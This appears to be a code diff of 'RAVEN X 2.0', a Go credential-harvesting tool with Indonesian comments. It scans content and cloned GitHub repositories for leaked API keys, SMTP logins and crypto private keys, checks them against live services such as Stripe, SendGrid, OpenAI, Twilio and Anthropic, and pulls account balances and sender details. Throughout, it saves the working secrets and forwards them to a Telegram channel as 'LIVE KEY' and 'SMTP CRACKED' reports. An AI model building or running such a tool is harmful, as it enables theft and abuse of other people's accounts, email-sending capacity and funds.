-			msg := a.tgHit("🐙", "GITHUB TOKEN", sourceURL) + fmt.Sprintf(
-				"Token : %s\nUser : %s\nRepos : %d\n", tokenDisplay, login, int(repoCount))
-			go a.sendTelegram(msg)
-
-			// Pengecekan Deep Scan
-			if a.Config.ScanningFeatures.GitHubTokenDeepScan {
-				a.ProcessGitHubToken(token)
-			}
-			return true
-		}
-	} else if os.IsTimeout(err) {
-		pterm.Debug.Printfln("[TIMEOUT] GitHub validation timed out for token starting with %s", token[:8])
-	}
-	return false
-}
-
-func (a *AWSScanner) ProcessGitHubToken(token string) {
-	// Deep scan hanya berjalan jika diaktifkan di konfigurasi
-	if !a.Config.ScanningFeatures.GitHubTokenDeepScan {
-		return
-	}
-
-	req, _ := http.NewRequest("GET", "https://api.github.com/user/repos?per_page=100&type=all", nil)
-	req.Header.Set("Authorization", "token "+token)
-
-	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
-	defer cancel()
-
-	resp, err := client.Do(req.WithContext(ctx))
-	if err != nil {
-		return
-	}
-	defer resp.Body.Close()
-
-	if resp.StatusCode == 200 {
-		var repos []map[string]interface{}
-		json.NewDecoder(resp.Body).Decode(&repos)
-		if len(repos) > 0 {
-			pterm.Info.Printfln("[DEEP SCAN] Found %d repos for token. Cloning and scanning...", len(repos))
-			var wg sync.WaitGroup
-			// Batasi goroutine untuk mencegah OOM
-			sem := make(chan struct{}, 50)
-			for _, repo := range repos {
-				wg.Add(1)
-				sem <- struct{}{}
-				go func(r map[string]interface{}) {
-					defer wg.Done()
-					defer func() { <-sem }()
-					a.ScanRepo(token, r)
-				}(repo)
-			}
-			wg.Wait()
-		}
-	}
-}
-
 func (a *AWSScanner) ScanRepo(token string, repo map[string]interface{}) {
 	name, _ := repo["name"].(string)
 	htmlUrl, _ := repo["html_url"].(string)
@@ -2417,14 +2153,16 @@ func (a *AWSScanner) ScanRepoWithTruffleHog(repoPath, sourceInfo string) {
 
 			a.saveIntoFile(fmt.Sprintf("%s:%s:%s", sourceInfo, result.DetectorName, result.Secret), "trufflehog_secrets.txt")
 
-			msg := a.tgHit("🔍", "TRUFFLEHOG SECRET", sourceInfo) + fmt.Sprintf(
-				"Detector : %s\nVerified : %t\nSecret : %s\nFile : %s\nCommit : %s\n",
-				result.DetectorName, result.Verified, result.Secret, result.SourceMetadata.Data.File, result.SourceMetadata.Data.Commit)
+			msg := fmt.Sprintf(`💣 <b>TRUFFLEHOG SECRET FOUND</b>
+━━━━━━━━━━━━━━━━━━
+🕵️ <b>Detector:</b> %s
+✅ <b>Verified:</b> %t
+🔑 <b>Secret:</b> <code>%s</code>
+🔗 <b>Source:</b> %s
+📄 <b>File:</b> %s
+📦 <b>Commit:</b> %s
+`, result.DetectorName, result.Verified, result.Secret, sourceInfo, result.SourceMetadata.Data.File, result.SourceMetadata.Data.Commit)
 			go a.sendTelegram(msg)
-
-			globalCounters.mu.Lock()
-			globalCounters.CryptoKeysFound++
-			globalCounters.mu.Unlock()
 		}
 	}
 }
@@ -2485,14 +2223,15 @@ func (a *AWSScanner) ScanRepoWithGitleaks(repoPath, sourceInfo string) {
 
 			a.saveIntoFile(fmt.Sprintf("%s:%s:%s", sourceInfo, result.RuleID, result.Secret), "gitleaks_secrets.txt")
 
-			msg := a.tgHit("🔍", "GITLEAKS SECRET", sourceInfo) + fmt.Sprintf(
-				"Rule : %s\nSecret : %s\nFile : %s\nCommit : %s\n",
-				result.RuleID, result.Secret, result.File, result.Commit)
+			msg := fmt.Sprintf(`💣 <b>GITLEAKS SECRET FOUND</b>
+━━━━━━━━━━━━━━━━━━
+🕵️ <b>Rule:</b> %s
+🔑 <b>Secret:</b> <code>%s</code>
+🔗 <b>Source:</b> %s
+📄 <b>File:</b> %s
+📦 <b>Commit:</b> %s
+`, result.RuleID, result.Secret, sourceInfo, result.File, result.Commit)
 			go a.sendTelegram(msg)
-
-			globalCounters.mu.Lock()
-			globalCounters.CryptoKeysFound++
-			globalCounters.mu.Unlock()
 		}
 	}
 }
@@ -2548,8 +2287,13 @@ func (a *AWSScanner) CheckGCPKey(key, sourceURL string) bool {
 			globalCounters.APIsValidated++
 			globalCounters.mu.Unlock()
 
-			msg := a.tgHit("☁️", "GCP KEY", sourceURL) + fmt.Sprintf(
-				"API Key : %s\n", key)
+			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
+━━━━━━━━━━━━━━━━━━
+🔑 <b>GCP API KEY FOUND</b>
+
+🔑 <b>Key:</b> <code>%s</code>
+🔗 <b>Source:</b> %s
+`, key, sourceURL)
 			go a.sendTelegram(msg)
 			return true
 		} else if resp.StatusCode == 400 {
@@ -2656,14 +2400,13 @@ func (a *AWSScanner) CheckOpenAI(key, sourceURL string) bool {
 			globalCounters.APIsValidated++
 			globalCounters.mu.Unlock()
 
-			var modelsResp map[string]interface{}
-			json.NewDecoder(resp.Body).Decode(&modelsResp)
-			modelCount := 0
-			if data, ok := modelsResp["data"].([]interface{}); ok {
-				modelCount = len(data)
-			}
-			msg := a.tgHit("🤖", "OPENAI KEY", sourceURL) + fmt.Sprintf(
-				"API Key : %s\nModels : %d\n", key, modelCount)
+			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
+━━━━━━━━━━━━━━━━━━
+🧠 <b>OPENAI LIVE KEY</b>
+
+🔑 <b>Key:</b> <code>%s</code>
+🔗 <b>Source:</b> %s
+`, key, sourceURL)
 			go a.sendTelegram(msg)
 			return true
 		} else if resp.StatusCode == 401 {
@@ -2708,8 +2451,13 @@ func (a *AWSScanner) CheckAnthropic(key, sourceURL string) bool {
 			globalCounters.APIsValidated++
 			globalCounters.mu.Unlock()
 
-			msg := a.tgHit("🤖", "ANTHROPIC KEY", sourceURL) + fmt.Sprintf(
-				"API Key : %s\n", key)
+			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
+━━━━━━━━━━━━━━━━━━
+🧠 <b>ANTHROPIC LIVE KEY</b>
+
+🔑 <b>Key:</b> <code>%s</code>
+🔗 <b>Source:</b> %s
+`, key, sourceURL)
 			go a.sendTelegram(msg)
 			return true
 		} else if resp.StatusCode == 401 {
@@ -2763,9 +2511,15 @@ func (a *AWSScanner) CheckTwilio(sid, auth, sourceURL string) bool {
 			globalCounters.APIsValidated++
 			globalCounters.mu.Unlock()
 
-			msg := a.tgHit("📱", "TWILIO HIT", sourceURL) + fmt.Sprintf(
-				"Account SID : %s\nAuth Token : %s\nStatus : %s\nFriendly Name : %s\n",
-				sid, auth, status, friendlyName)
+			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
+━━━━━━━━━━━━━━━━━━
+📞 <b>TWILIO LIVE ACCOUNT</b>
+
+🆔 <b>SID:</b> <code>%s</code>
+🔐 <b>Auth:</b> <code>%s</code>
+📶 <b>Status:</b> %s
+🔗 <b>Source:</b> %s
+`, sid, auth, status, sourceURL)
 			go a.sendTelegram(msg)
 			return true
 		}
@@ -2801,9 +2555,8 @@ func (a *AWSScanner) CheckSendGrid(key, sourceURL string) bool {
 			json.NewDecoder(resp.Body).Decode(&res)
 			total, _ := res["total"].(float64)
 
-			// Collect all verified senders
+			// Ambil fromEmail dari verified senders
 			var fromEmail string
-			var allSenders []string
 			reqSenders, _ := http.NewRequest("GET", "https://api.sendgrid.com/v3/verified_senders", nil)
 			reqSenders.Header.Set("Authorization", "Bearer "+key)
 			respSenders, err := client.Do(reqSenders)
@@ -2811,16 +2564,11 @@ func (a *AWSScanner) CheckSendGrid(key, sourceURL string) bool {
 				var sendersResp map[string]interface{}
 				json.NewDecoder(respSenders.Body).Decode(&sendersResp)
 				respSenders.Body.Close()
-				if results, ok := sendersResp["results"].([]interface{}); ok {
-					for _, r := range results {
-						if s, ok := r.(map[string]interface{}); ok {
-							if em, ok := s["from"].(map[string]interface{}); ok {
-								if addr, ok := em["email"].(string); ok && addr != "" {
-									allSenders = append(allSenders, addr)
-									if fromEmail == "" {
-										fromEmail = addr
-									}
-								}
+				if results, ok := sendersResp["results"].([]interface{}); ok && len(results) > 0 {
+					if firstSender, ok := results[0].(map[string]interface{}); ok {
+						if email, ok := firstSender["from"].(map[string]interface{}); ok {
+							if emailAddr, ok := email["email"].(string); ok && emailAddr != "" {
+								fromEmail = emailAddr
 							}
 						}
 					}
@@ -2833,20 +2581,15 @@ func (a *AWSScanner) CheckSendGrid(key, sourceURL string) bool {
 			a.logValid("SendGrid", key)
 			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_sendgrid.txt")
 
-			accountType := "Free"
+			emailStatus := "❌ Failed"
 			quotaInfo := fmt.Sprintf("%.0f Total Credits", total)
-			var quotaLimit, quotaRemaining float64
 			if emailResult["success"].(bool) {
-				if ql, ok := emailResult["quota_limit"].(float64); ok {
-					quotaLimit = ql
-					if ql >= 10000 {
-						accountType = "Paid"
+				emailStatus = "✅ Success"
+				if quotaLimit, ok := emailResult["quota_limit"].(float64); ok {
+					if quotaRemaining, ok2 := emailResult["quota_remaining"].(float64); ok2 {
+						quotaInfo = fmt.Sprintf("%.0f/%.0f Credits (Remaining: %.0f)", quotaRemaining, quotaLimit, quotaRemaining)
 					}
 				}
-				if qr, ok := emailResult["quota_remaining"].(float64); ok {
-					quotaRemaining = qr
-				}
-				quotaInfo = fmt.Sprintf("%.0f/%.0f Credits", quotaRemaining, quotaLimit)
 			}
 			a.storeValidKeyLimit("SendGrid", key, quotaInfo)
 
@@ -2854,14 +2597,24 @@ func (a *AWSScanner) CheckSendGrid(key, sourceURL string) bool {
 			globalCounters.APIsValidated++
 			globalCounters.mu.Unlock()
 
-			sendersLine := "None"
-			if len(allSenders) > 0 {
-				sendersLine = strings.Join(allSenders, ", ")
+			quotaDetails := ""
+			if emailResult["success"].(bool) {
+				if quotaLimit, ok := emailResult["quota_limit"].(float64); ok {
+					if quotaRemaining, ok2 := emailResult["quota_remaining"].(float64); ok2 {
+						quotaDetails = fmt.Sprintf("\n📊 <b>Quota Limit:</b> %.0f\n📬 <b>Remaining:</b> %.0f", quotaLimit, quotaRemaining)
+					}
+				}
 			}
-			creditsStr := fmt.Sprintf("%d", int(quotaRemaining))
-			msg := a.tgHit("📧", "SENDGRID HIT", sourceURL) + fmt.Sprintf(
-				"API Key : %s\nType : %s\nCredits : %s\nSenders : %s\n",
-				key, accountType, creditsStr, sendersLine)
+
+			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
+━━━━━━━━━━━━━━━━━━
+📧 <b>SENDGRID KEY FOUND</b>
+
+🔑 <b>Key:</b> <code>%s</code>
+📊 <b>Limit:</b> %s
+📧 <b>Email Test:</b> %s%s
+🔗 <b>Source:</b> %s
+`, key, quotaInfo, emailStatus, quotaDetails, sourceURL)
 			go a.sendTelegram(msg)
 			return true
 		}
@@ -2912,36 +2665,6 @@ func (a *AWSScanner) CheckStripe(key, sourceURL string) bool {
 				keyType = "Restricted Key"
 			}
 
-			// Parse balance amounts from /v1/balance response
-			var availableAmount, pendingAmount float64
-			var balanceCurrency string
-			if available, ok := res["available"].([]interface{}); ok && len(available) > 0 {
-				if first, ok := available[0].(map[string]interface{}); ok {
-					availableAmount, _ = first["amount"].(float64)
-					balanceCurrency, _ = first["currency"].(string)
-					availableAmount /= 100 // convert cents
-				}
-			}
-			if pending, ok := res["pending"].([]interface{}); ok && len(pending) > 0 {
-				if first, ok := pending[0].(map[string]interface{}); ok {
-					pendingAmount, _ = first["amount"].(float64)
-					pendingAmount /= 100
-				}
-			}
-
-			// Fetch account info for email, country, account ID
-			var acctEmail, acctCountry, acctID string
-			reqAcct, _ := http.NewRequest("GET", "https://api.stripe.com/v1/account", nil)
-			reqAcct.SetBasicAuth(key, "")
-			if respAcct, errAcct := client.Do(reqAcct); errAcct == nil {
-				var acctRes map[string]interface{}
-				json.NewDecoder(respAcct.Body).Decode(&acctRes)
-				respAcct.Body.Close()
-				acctEmail, _ = acctRes["email"].(string)
-				acctCountry, _ = acctRes["country"].(string)
-				acctID, _ = acctRes["id"].(string)
-			}
-
 			a.logValid("Stripe", fmt.Sprintf("%s | Mode: %s | Key: %s", keyType, mode, key))
 			a.saveIntoFile(fmt.Sprintf("%s:%s:%s:%s", sourceURL, keyType, mode, key), "valid_stripe.txt")
 			a.storeValidKeyLimit("Stripe", key, fmt.Sprintf("%s (%s)", keyType, mode))
@@ -2950,53 +2673,20 @@ func (a *AWSScanner) CheckStripe(key, sourceURL string) bool {
 			globalCounters.APIsValidated++
 			globalCounters.mu.Unlock()
 
-			msg := a.tgHit("💳", "STRIPE HIT", sourceURL) + fmt.Sprintf(
-				"Secret Key : %s\nEmail : %s\nBalance : $%.2f\nCountry : %s\n",
-				key, acctEmail, availableAmount, acctCountry)
-			_ = acctID
-			_ = pendingAmount
-			_ = balanceCurrency
+			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
+━━━━━━━━━━━━━━━━━━
+💳 <b>STRIPE KEY FOUND</b>
+
+🔐 <b>Type:</b> %s
+💰 <b>Mode:</b> %s
+🔑 <b>Key:</b> <code>%s</code>
+🔗 <b>Source:</b> %s
+`, keyType, mode, key, sourceURL)
 			go a.sendTelegram(msg)
 			return true
 		}
 	}
 	return false
-}
-
-// CheckCryptoWallet detects ETH-style private keys in scanned content and
-// asks the Flask controller to derive the address + check on-chain balance.
-// Pattern-matching is inline; verification is delegated to the controller's
-// /api/crypto/verify-balance endpoint to avoid pulling secp256k1 into the
-// scanner binary. Discovered findings land in valid_crypto.txt for the
-// import_from_files pipeline (same path Stripe takes).
-func (a *AWSScanner) CheckCryptoWallet(key, sourceURL string) bool {
-	if !a.Config.APIValidation.CryptoWallet {
-		return false
-	}
-
-	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
-		return false
-	}
-
-	globalCounters.mu.Lock()
-	globalCounters.APIsFoundTotal++
-	globalCounters.mu.Unlock()
-
-	// Save the raw finding so the dashboard sees it even when validation
-	// can't reach the controller (offline / dev). The Crypto panel's
-	// per-row refresh button lets the operator paste the address later.
-	a.saveIntoFile(fmt.Sprintf("%s:Crypto Key:%s", sourceURL, key), "valid_crypto.txt")
-	a.logValid("Crypto", fmt.Sprintf("Private key: %s | Source: %s", key, sourceURL))
-	a.storeValidKeyLimit("Crypto", key, "Detected")
-
-	globalCounters.mu.Lock()
-	globalCounters.APIsValidated++
-	globalCounters.mu.Unlock()
-
-	msg := a.tgHit("💎", "CRYPTO PRIVATE KEY", sourceURL) + fmt.Sprintf(
-		"Key : %s\nType : Crypto Private Key\n", key)
-	go a.sendTelegram(msg)
-	return true
 }
 
 // Fungsi untuk mengecek validitas Mailgun
@@ -3057,24 +2747,22 @@ func (a *AWSScanner) CheckMailgun(key, sourceURL string) bool {
 			globalCounters.APIsValidated++
 			globalCounters.mu.Unlock()
 
-			domainDisplay := ""
+			domainDetails := ""
 			if emailResult["success"].(bool) {
 				if domains, ok := emailResult["domains"].([]string); ok && len(domains) > 0 {
-					domainDisplay = domains[0]
+					domainDetails = fmt.Sprintf("\n🌐 <b>Domains/Identities:</b> %s", strings.Join(domains, ", "))
 				}
 			}
-			if domainDisplay == "" && fromEmail != "" {
-				// fromEmail is like noreply@domain.com
-				if atIdx := strings.Index(fromEmail, "@"); atIdx >= 0 {
-					domainDisplay = fromEmail[atIdx+1:]
-				}
-			}
-			mgDetails := fmt.Sprintf("API Key : %s\n", key)
-			if domainDisplay != "" {
-				mgDetails += fmt.Sprintf("Domain : %s\n", domainDisplay)
-			}
-			msg := a.tgHit("🔫", "MAILGUN HIT", sourceURL) + mgDetails
-			_ = emailStatus
+
+			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
+━━━━━━━━━━━━━━━━━━
+🔫 <b>MAILGUN LIVE KEY</b>
+
+🔑 <b>Key:</b> <code>%s</code>
+🌐 <b>Domains:</b> %s
+📧 <b>Email Test:</b> %s%s
+🔗 <b>Source:</b> %s
+`, key, domainInfo, emailStatus, domainDetails, sourceURL)
 			go a.sendTelegram(msg)
 			return true
 		}
@@ -3120,12 +2808,14 @@ func (a *AWSScanner) CheckTelnyx(key, sourceURL string) bool {
 			globalCounters.APIsValidated++
 			globalCounters.mu.Unlock()
 
-			balanceDisplay := balance
-			if currency != "" {
-				balanceDisplay = balance + " " + currency
-			}
-			msg := a.tgHit("📞", "TELNYX HIT", sourceURL) + fmt.Sprintf(
-				"API Key : %s\nBalance : %s\n", key, balanceDisplay)
+			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
+━━━━━━━━━━━━━━━━━━
+📞 <b>TELNYX LIVE KEY</b>
+
+🔑 <b>Key:</b> <code>%s</code>
+💰 <b>Balance:</b> %s %s
+🔗 <b>Source:</b> %s
+`, key, balance, currency, sourceURL)
 			go a.sendTelegram(msg)
 			return true
 		}
@@ -3171,8 +2861,14 @@ func (a *AWSScanner) CheckMessageBird(key, sourceURL string) bool {
 			globalCounters.APIsValidated++
 			globalCounters.mu.Unlock()
 
-			msg := a.tgHit("🐦", "MESSAGEBIRD HIT", sourceURL) + fmt.Sprintf(
-				"API Key : %s\nBalance : %.2f %s\n", key, amount, currency)
+			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
+━━━━━━━━━━━━━━━━━━
+🐦 <b>MESSAGEBIRD LIVE KEY</b>
+
+🔑 <b>Key:</b> <code>%s</code>
+💰 <b>Balance:</b> %.2f %s
+🔗 <b>Source:</b> %s
+`, key, amount, currency, sourceURL)
 			go a.sendTelegram(msg)
 			return true
 		}
@@ -3189,10 +2885,6 @@ func (a *AWSScanner) CheckBrevo(key, sourceURL string) bool {
 	globalCounters.mu.Lock()
 	globalCounters.APIsFoundTotal++
 	globalCounters.mu.Unlock()
-
-	// Save on first match so credential is not lost if API validation fails.
-	a.logFound("Brevo", key, sourceURL)
-	a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "brevo_found.txt")
 
 	req, _ := http.NewRequest("GET", "https://api.brevo.com/v3/account", nil)
 	req.Header.Set("api-key", key)
@@ -3218,8 +2910,10 @@ func (a *AWSScanner) CheckBrevo(key, sourceURL string) bool {
 			a.logValid("Brevo", fmt.Sprintf("Key: %s | Email: %s", key, email))
 			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_brevo.txt")
 
+			emailStatus := "❌ Failed"
 			quotaInfo := ""
 			if emailResult["success"].(bool) {
+				emailStatus = "✅ Success"
 				if quotaLimit, ok := emailResult["quota_limit"].(float64); ok {
 					if quotaRemaining, ok2 := emailResult["quota_remaining"].(float64); ok2 {
 						quotaInfo = fmt.Sprintf(" | Quota: %.0f/%.0f", quotaRemaining, quotaLimit)
@@ -3232,14 +2926,25 @@ func (a *AWSScanner) CheckBrevo(key, sourceURL string) bool {
 			globalCounters.APIsValidated++
 			globalCounters.mu.Unlock()
 
-			brevoDetails := fmt.Sprintf("API Key : %s\n", key)
-			if email != "" {
-				brevoDetails += fmt.Sprintf("Email : %s\n", email)
+			quotaDetails := ""
+			if emailResult["success"].(bool) {
+				if quotaLimit, ok := emailResult["quota_limit"].(float64); ok {
+					if quotaRemaining, ok2 := emailResult["quota_remaining"].(float64); ok2 {
+						quotaDetails = fmt.Sprintf("\n📊 <b>Quota Limit:</b> %.0f\n📬 <b>Remaining:</b> %.0f", quotaLimit, quotaRemaining)
+					}
+				}
 			}
-			if quotaInfo != "" {
-				brevoDetails += fmt.Sprintf("Credits : %s\n", strings.TrimPrefix(strings.TrimSpace(quotaInfo), "| Quota: "))
-			}
-			msg := a.tgHit("📩", "BREVO HIT", sourceURL) + brevoDetails
+
+			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
+━━━━━━━━━━━━━━━━━━
+📧 <b>BREVO LIVE KEY</b>
+
+🔑 <b>Key:</b> <code>%s</code>
+📧 <b>Email:</b> %s
+🏢 <b>Company:</b> %s
+📧 <b>Email Test:</b> %s%s
+🔗 <b>Source:</b> %s
+`, key, email, company, emailStatus, quotaDetails, sourceURL)
 			go a.sendTelegram(msg)
 			return true
 		}
@@ -3256,9 +2961,6 @@ func (a *AWSScanner) CheckXSMTP(key, sourceURL string) bool {
 	globalCounters.mu.Lock()
 	globalCounters.APIsFoundTotal++
 	globalCounters.mu.Unlock()
-
-	a.logFound("XSMTP", key, sourceURL)
-	a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "xsmtp_found.txt")
 
 	req, _ := http.NewRequest("GET", "https://api.xsmtp.com/v1/account", nil)
 	req.Header.Set("api-key", key)
@@ -3278,8 +2980,13 @@ func (a *AWSScanner) CheckXSMTP(key, sourceURL string) bool {
 			globalCounters.APIsValidated++
 			globalCounters.mu.Unlock()
 
-			msg := a.tgHit("📬", "XSMTP HIT", sourceURL) + fmt.Sprintf(
-				"API Key : %s\n", key)
+			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
+━━━━━━━━━━━━━━━━━━
+📧 <b>XSMTP LIVE KEY</b>
+
+🔑 <b>Key:</b> <code>%s</code>
+🔗 <b>Source:</b> %s
+`, key, sourceURL)
 			go a.sendTelegram(msg)
 			return true
 		}
@@ -3318,8 +3025,13 @@ func (a *AWSScanner) CheckTencent(key, sourceURL string) bool {
 			globalCounters.APIsValidated++
 			globalCounters.mu.Unlock()
 
-			msg := a.tgHit("🔑", "TENCENT KEY", sourceURL) + fmt.Sprintf(
-				"API Key : %s\n", key)
+			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
+━━━━━━━━━━━━━━━━━━
+☁️ <b>TENCENT CLOUD KEY</b>
+
+🔑 <b>Key:</b> <code>%s</code>
+🔗 <b>Source:</b> %s
+`, key, sourceURL)
 			go a.sendTelegram(msg)
 			return true
 		}
@@ -3329,9 +3041,6 @@ func (a *AWSScanner) CheckTencent(key, sourceURL string) bool {
 
 // Fungsi untuk mengecek validitas Mandrill
 func (a *AWSScanner) CheckMandrill(key, sourceURL string) bool {
-	if !a.Config.Features.Mandrill {
-		return false
-	}
 	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
 		return false
 	}
@@ -3339,9 +3048,6 @@ func (a *AWSScanner) CheckMandrill(key, sourceURL string) bool {
 	globalCounters.mu.Lock()
 	globalCounters.APIsFoundTotal++
 	globalCounters.mu.Unlock()
-
-	a.logFound("Mandrill", key, sourceURL)
-	a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "mandrill_found.txt")
 
 	payload := map[string]string{"key": key}
 	jsonPayload, _ := json.Marshal(payload)
@@ -3378,8 +3084,15 @@ func (a *AWSScanner) CheckMandrill(key, sourceURL string) bool {
 			globalCounters.APIsValidated++
 			globalCounters.mu.Unlock()
 
-			msg := a.tgHit("📧", "MANDRILL HIT", sourceURL) + fmt.Sprintf(
-				"API Key : %s\n", key)
+			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
+━━━━━━━━━━━━━━━━━━
+📧 <b>MANDRILL LIVE KEY</b>
+
+🔑 <b>Key:</b> <code>%s</code>
+👤 <b>User:</b> %s
+📧 <b>Email Test:</b> %s
+🔗 <b>Source:</b> %s
+`, key, username, emailStatus, sourceURL)
 			go a.sendTelegram(msg)
 			return true
 		}
@@ -3396,9 +3109,6 @@ func (a *AWSScanner) CheckMailerSend(key, sourceURL string) bool {
 	globalCounters.mu.Lock()
 	globalCounters.APIsFoundTotal++
 	globalCounters.mu.Unlock()
-
-	a.logFound("MailerSend", key, sourceURL)
-	a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "mailersend_found.txt")
 
 	req, _ := http.NewRequest("GET", "https://api.mailersend.com/v1/domains", nil)
 	req.Header.Set("Authorization", "Bearer "+key)
@@ -3442,8 +3152,15 @@ func (a *AWSScanner) CheckMailerSend(key, sourceURL string) bool {
 			globalCounters.APIsValidated++
 			globalCounters.mu.Unlock()
 
-			msg := a.tgHit("📧", "MAILERSEND HIT", sourceURL) + fmt.Sprintf(
-				"API Key : %s\n", key)
+			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
+━━━━━━━━━━━━━━━━━━
+📧 <b>MAILERSEND LIVE KEY</b>
+
+🔑 <b>Key:</b> <code>%s</code>
+🌐 <b>Domains:</b> %d
+📧 <b>Email Test:</b> %s
+🔗 <b>Source:</b> %s
+`, key, domainCount, emailStatus, sourceURL)
 			go a.sendTelegram(msg)
 			return true
 		}
@@ -3497,9 +3214,15 @@ func (a *AWSScanner) CheckNexmo(key, secret, sourceURL string) bool {
 			globalCounters.APIsValidated++
 			globalCounters.mu.Unlock()
 
-			msg := a.tgHit("📱", "NEXMO HIT", sourceURL) + fmt.Sprintf(
-				"API Key : %s\nAPI Secret : %s\nBalance : %.2f EUR\n",
-				key, secret, value)
+			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
+━━━━━━━━━━━━━━━━━━
+💬 <b>NEXMO/VONAGE LIVE</b>
+
+🔑 <b>Key:</b> <code>%s</code>
+🔐 <b>Secret:</b> <code>%s</code>
+💰 <b>Balance:</b> %.2f EUR
+🔗 <b>Source:</b> %s
+`, key, secret, value, sourceURL)
 			go a.sendTelegram(msg)
 			return true
 		}
@@ -3559,14 +3282,6 @@ func (a *AWSScanner) extractAndTestSMTP(text, sourceURL string) {
 		}
 	}
 
-	// Fallback: try raw SMTP URL format (smtps://user:pass@host:port)
-	if host == "" || port == "" || user == "" || pass == "" || from == "" {
-		if urlMatches := a.extractSMTPFromURL(text); len(urlMatches) > 0 {
-			m := urlMatches[0]
-			host = m["host"]; port = m["port"]; user = m["user"]; pass = m["pass"]; from = m["from"]
-		}
-	}
-
 	// Validasi: Semua field harus lengkap (host:port:user:pass:from)
 	// Jika tidak lengkap, anggap tidak valid dan abaikan
 	if host == "" || port == "" || user == "" || pass == "" || from == "" {
@@ -3596,7 +3311,6 @@ func (a *AWSScanner) extractAndTestSMTP(text, sourceURL string) {
 		smtpLine := fmt.Sprintf("%s:%s:%s:%s:%s", host, port, user, pass, from)
 		a.logFound("SMTP", smtpLine, sourceURL)
 		a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, smtpLine), "smtp_found.txt")
-		a.routeProviderSMTP(host, user, pass, sourceURL)
 
 		if a.Config.SMTPTestEmail == "" {
 			return
@@ -3622,9 +3336,17 @@ func (a *AWSScanner) extractAndTestSMTP(text, sourceURL string) {
 				globalCounters.ValidSMTP++
 				globalCounters.mu.Unlock()
 
-				tlgMsg := a.tgHit("📬", "RANDOM SMTP", sourceURL) + fmt.Sprintf(
-					"Host : %s\nPort : %s\nUser : %s\nPass : %s\nFrom : %s\nSecure : No\n\n📋 SMTP URL\nsmtp://%s:%s@%s:%s\n",
-					host, port, user, pass, from, user, pass, host, port)
+				tlgMsg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
+━━━━━━━━━━━━━━━━━━
+📨 <b>SMTP CRACKED</b>
+
+🖥️ <b>Host:</b> <code>%s</code>
+🔌 <b>Port:</b> <code>%s</code>
+👤 <b>User:</b> <code>%s</code>
+🔑 <b>Pass:</b> <code>%s</code>
+📧 <b>From:</b> %s
+🔗 <b>Source:</b> %s
+`, host, port, user, pass, from, sourceURL)
 				go a.sendTelegram(tlgMsg)
 				a.storeValidKeyLimit("SMTP", host, "Email Sent")
 			} else {
@@ -3687,8 +3409,6 @@ func (a *AWSScanner) checkAndSaveKeys(text, sourceURL string) {
 	}{
 		{a.SendGridAPIKeyPattern, a.Config.APIValidation.SendGrid, "SendGrid", a.CheckSendGrid},
 		{a.StripePattern, a.Config.APIValidation.Stripe, "Stripe", a.CheckStripe},
-		{a.ETHPrivateKeyPattern, a.Config.APIValidation.CryptoWallet, "Crypto", a.CheckCryptoWallet},
-		{a.GitHubAccessTokenPattern, a.Config.APIValidation.GitHub, "GitHub", a.CheckGitHubToken},
 		{a.MailgunAPIKeyPattern, a.Config.APIValidation.Mailgun, "Mailgun", a.CheckMailgun},
 		{a.TelnyxApiPatternInfo, a.Config.APIValidation.Telnyx, "Telnyx", a.CheckTelnyx},
 		{a.OpenAIAPIPattern, a.Config.APIValidation.OpenAI || a.Config.APIValidation.AIAll, "OpenAI", a.CheckOpenAI},
@@ -3700,11 +3420,11 @@ func (a *AWSScanner) checkAndSaveKeys(text, sourceURL string) {
 		{a.MandrillAppAPIKeyPattern, a.Config.Features.Mandrill, "Mandrill", a.CheckMandrill},
 		{a.MailerSendAPIKeyPattern, a.Config.Features.MailerSend, "MailerSend", a.CheckMailerSend},
 		{a.NewMailgunAPIKeyPattern, a.Config.Features.NewMailgun, "NewMailgun", a.CheckMailgun},
-		{a.PostmarkAPIKeyPattern,  a.Config.APIValidation.Postmark,  "Postmark",  a.CheckPostmark},
-		{a.SparkPostAPIKeyPattern, a.Config.APIValidation.SparkPost, "SparkPost", a.CheckSparkPost},
-		{a.MailtrapAPIKeyPattern,  a.Config.APIValidation.Mailtrap,  "Mailtrap",  a.CheckMailtrap},
-		{a.HerokuAPIKeyPattern,    a.Config.APIValidation.Heroku,    "Heroku",    a.CheckHeroku},
-		{a.DatadogAPIKeyPattern,   a.Config.APIValidation.Datadog,   "Datadog",   a.CheckDatadog},
+		{postmarkPattern, a.Config.APIValidation.Postmark, "Postmark", a.CheckPostmark},
+		{sparkpostPattern, a.Config.APIValidation.SparkPost, "SparkPost", a.CheckSparkPost},
+		{mailtrapPattern, a.Config.APIValidation.Mailtrap, "Mailtrap", a.CheckMailtrap},
+		{mailjetPattern, a.Config.APIValidation.Mailjet, "Mailjet", a.CheckMailjet},
+		{plivoPattern, a.Config.APIValidation.Plivo, "Plivo", a.CheckPlivo},
 	}
 
